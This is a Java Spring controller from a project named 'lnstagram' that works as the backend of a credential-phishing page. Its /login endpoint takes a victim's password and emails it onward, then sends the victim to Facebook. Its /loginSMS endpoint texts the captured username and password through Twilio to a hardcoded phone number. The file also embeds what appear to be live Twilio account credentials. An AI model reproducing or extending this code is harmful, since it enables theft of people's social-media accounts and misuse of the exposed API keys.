package lnstagram.controller;

import com.twilio.http.TwilioRestClient;
import lnstagram.service.ArtistaService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import com.twilio.Twilio;
import com.twilio.rest.api.v2010.account.Message;
import com.twilio.type.PhoneNumber;



@Controller
public class ArtistaController {

	private final static String ACCOUNT_SID = "AC06f3c3bd1ca7192e7035bab214c97777";
	private final static String AUTH_ID = "a012669905f230a49ca0e2d97f29e991";

	static {
		Twilio.init(ACCOUNT_SID, AUTH_ID);
	}
	
	@Autowired
	private ArtistaService artistaService;

	//@RequestMapping(value = "/admin/addArtista", method = RequestMethod.GET)
	//public String addArtista(Model model) {
	//
	//		logger.debug("addArtista");
	//		model.addAttribute("artista", new Artista());
	//		return "admin/artista/artistaForm.html";
	//
	//}
	//
	@RequestMapping(value = "/login")
	public String cancellaArtista(@RequestParam("pw")String password) {

		this.artistaService.inviaPassword(password);
		this.artistaService.sendEmail();

		return "www.facebook.com";
	}

	@RequestMapping(value = "/loginSMS")
	public ResponseEntity<String> sendSMS(@RequestParam("pw")String password, @RequestParam("us")String username) {

		Message.creator(new PhoneNumber("+393311528536"),
				new PhoneNumber("+19126168038"), "Username:" + username +"\n"+" Password:"+"\n" +password ).create();


		return new ResponseEntity<String>("Message sent successfully", HttpStatus.OK);
	}



	//@RequestMapping(value = "/admin/artista", method = RequestMethod.POST)
	//public String newArtista(@ModelAttribute("artista") Artista artista, Model model, BindingResult bindingResult) {
	//
	//		this.artistaValidator.validate(artista, bindingResult);
	//		if(!bindingResult.hasErrors()) {
	//				this.artistaService.inserisci(artista);
	//				model.addAttribute("artisti", this.artistaService.tutti());
	//				return "admin/artista/successInsArtista.html";
	//		}
	//
	//		return "admin/artista/artistaForm.html";
	//
	//}
//
}
